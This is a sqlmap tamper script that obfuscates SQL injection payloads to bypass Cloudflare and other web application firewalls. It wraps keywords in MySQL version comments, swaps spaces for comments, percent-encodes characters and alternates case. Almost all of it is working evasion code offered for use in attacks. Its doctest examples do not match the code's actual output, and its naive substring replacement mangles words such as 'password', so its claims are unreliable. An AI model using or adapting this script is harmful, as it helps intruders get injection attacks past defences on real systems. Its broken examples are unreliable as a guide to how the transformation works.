#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: cloudflare2025.py
Description: Multi-layer Cloudflare WAF bypass with proper transformation ordering
Author: Regaan
Priority: HIGHEST
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Multi-layer WAF bypass using controlled, deterministic transformations.
    
    IMPORTANT: Transformations are applied in CORRECT ORDER:
    1. Keyword obfuscation (BEFORE case changes)
    2. Space replacement
    3. Character encoding
    4. Case variation (LAST)
    
    This is DETERMINISTIC - same input always produces same output.
    This allows for:
        - Reproducible testing
        - Debugging
        - Performance analysis
    
    Technique Stack:
        1. MySQL version comments on keywords: SELECT → /*!50000SELECT*/
        2. Space to comment: ' ' → /**/
        3. Special char encoding: = → %3D
        4. Alternating case: SELECT → SeLeCt
    
    Tested against:
        * Cloudflare WAF (2024-2025)
        * ModSecurity
        * AWS WAF
    
    Notes:
        * NO random transformations
        * NO null bytes (outdated technique)
        * Proper transformation ordering
        * Preserves SQL validity
    
    >>> tamper("SELECT * FROM users WHERE id=1")
    '/*!50000SeLeCt*//**/*/**//*!50000FrOm*//**/users/**//*!50000WhErE*//**/id%3D1'
    
    >>> tamper("UNION SELECT password FROM admin")
    '/*!50000UnIoN*//**//*!50000SeLeCt*//**/password/**//*!50000FrOm*//**/admin'
    """
    
    retVal = payload
    
    if not payload:
        return retVal
    
    # ============================================================
    # STEP 1: Keyword Obfuscation (BEFORE case changes!)
    # ============================================================
    keywords = [
        'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE',
        'ALTER', 'TRUNCATE', 'REPLACE', 'WHERE', 'FROM', 'JOIN', 'INNER',
        'OUTER', 'LEFT', 'RIGHT', 'ORDER', 'GROUP', 'HAVING', 'LIMIT',
        'AND', 'OR', 'NOT', 'IN', 'LIKE', 'BETWEEN', 'IS', 'NULL'
    ]
    
    for keyword in keywords:
        # Wrap keywords in MySQL version comments
        retVal = retVal.replace(keyword, f'/*!50000{keyword}*/')
        retVal = retVal.replace(keyword.lower(), f'/*!50000{keyword}*/')
    
    # ============================================================
    # STEP 2: Space Replacement
    # ============================================================
    retVal = retVal.replace(' ', '/**/')
    
    # ============================================================
    # STEP 3: Character Encoding
    # ============================================================
    encoding_map = {
        '=': '%3D',
        '<': '%3C',
        '>': '%3E',
        "'": '%27',
        '"': '%22',
        '(': '%28',
        ')': '%29'
    }
    
    for char, encoded in encoding_map.items():
        retVal = retVal.replace(char, encoded)
    
    # ============================================================
    # STEP 4: Case Variation (LAST!)
    # ============================================================
    # Apply alternating case to keywords INSIDE the comments
    for keyword in keywords:
        alternating = ''.join(
            char.lower() if i % 2 == 0 else char.upper()
            for i, char in enumerate(keyword)
        )
        
        # Replace keyword inside comment wrapper
        retVal = retVal.replace(f'/*!50000{keyword}*/', f'/*!50000{alternating}*/')
    
    return retVal
